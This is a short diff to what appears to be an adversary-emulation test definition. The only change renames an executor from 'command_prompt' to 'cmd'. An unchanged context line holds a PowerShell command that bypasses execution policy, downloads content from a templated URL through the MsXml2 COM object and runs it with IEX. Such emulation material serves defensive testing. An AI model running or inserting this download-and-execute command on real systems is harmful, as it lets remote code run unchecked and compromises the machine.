@@ -23,4 +23,4 @@ steps:
     - name: powershell-msxml-com-object---with-prompt
       inline: |
         powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','{{.Args.url}}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
-      executor: command_prompt
+      executor: cmd
